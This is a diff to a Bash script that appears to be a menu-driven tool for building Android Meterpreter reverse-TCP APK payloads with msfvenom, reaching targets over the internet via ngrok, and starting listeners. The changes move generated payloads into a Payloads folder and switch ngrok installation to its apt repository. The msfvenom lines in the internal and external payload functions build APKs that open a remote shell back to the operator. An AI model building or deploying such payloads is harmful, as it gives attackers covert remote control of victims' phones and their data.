@@ -39,6 +39,17 @@ check_system() {
         exit 1
     fi
 }
+#Check If Payloads directory is Exists
+check_payloads_dir() {
+    if [ -d "Payloads" ]; then
+        echo ''
+    else
+    
+        mkdir Payloads
+    
+    fi
+}
+
 # Official Links Of Us 
 
 YT=https://youtube.com/@linux_whith_mohamed
@@ -97,7 +108,7 @@ show_contacts() {
     sleep 0.08
     echo -e "${YELLOW}║ 📞 WhatsApp: ${NC}${WA}                 $YELLOW║"
     sleep 0.08
-    echo -e "${YELLOW}║ 💻 GitHub  : ${NC}${GITHUB}               $YELLOW║"
+    echo -e "${YELLOW}║ 💻 GitHub  : ${NC}${GITHUB}              $YELLOW║"
     sleep 0.08
     echo -e "${LBlue}╚══════════════════════════════════════════════════════════╝${NC}"
     sleep 0.08
@@ -130,11 +141,11 @@ create_internal_payload() {
     sleep 0.3s
     echo ''
     sleep 0.3s
-    msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost1 LPORT=$lport1 -o $payload_name.apk
+    msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost1 LPORT=$lport1 -o Payloads/$payload_name.apk
     sleep 1s
     echo ''
     sleep 1s
-    echo -e "${GREEN}[+] APK Payload Generated Successfully With Name $payload_name.apk (^_^) ${NC}"
+    echo -e "${GREEN}[+] APK Payload Generated Successfully With Name $payload_name.apk In Payloads Directory (^_^) ${NC}"
     sleep 3s
 }
 
@@ -162,11 +173,11 @@ create_external_payload() {
     echo -e $LGreen '';figlet -c -f slant "Generating ..."
     echo '' 
     sleep 0.3s
-    msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $payload_name.apk
+    msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o Payloads/$payload_name.apk
     sleep 2s
     echo '' 
     sleep 1s
-    echo -e "${GREEN}[+] APK Payload Generated Successfully With Name $payload_name.apk (^_^) ${NC}"
+    echo -e "${GREEN}[+] APK Payload Generated Successfully With Name $payload_name.apk In Payloads Directory (^_^) ${NC}"
     sleep 3s
 }
 
@@ -205,18 +216,15 @@ install_ngrok() {
     elif [[ "$SYSTEM" == "kali" ]]; then
         sudo rm -rf ngrok-stable-linux-amd64.zip
         sleep 1s
-        sudo apt install unzip -y
+        sudo apt install zip unzip curl -y
+        curl -sSL https://ngrok-agent.s3.amazonaws.com/ngrok.asc \
+        | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null \
+        && echo "deb https://ngrok-agent.s3.amazonaws.com buster main" \
+        | sudo tee /etc/apt/sources.list.d/ngrok.list \
+        && sudo apt update \
+        && sudo apt install ngrok
         sleep 1s
-        wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
-        sleep 0.5
         echo ''
-        unzip ngrok-stable-linux-amd64.zip
-        sleep 1s
-        chmod +x ngrok
-        sleep 1s
-        sudo mv ngrok /usr/local/bin/
-        sudo chmod +x /usr/local/bin/ngrok
-        sudo rm -rf ngrok-stable-linux-amd64.zip
         sleep 1s
         clear 
         sleep 0.5s
@@ -331,6 +339,7 @@ start_external_listener() {
 
 # Main Menu 
 main_menu() {
+    check_payloads_dir
     sleep 1s
     clear
     sleep 0.5s
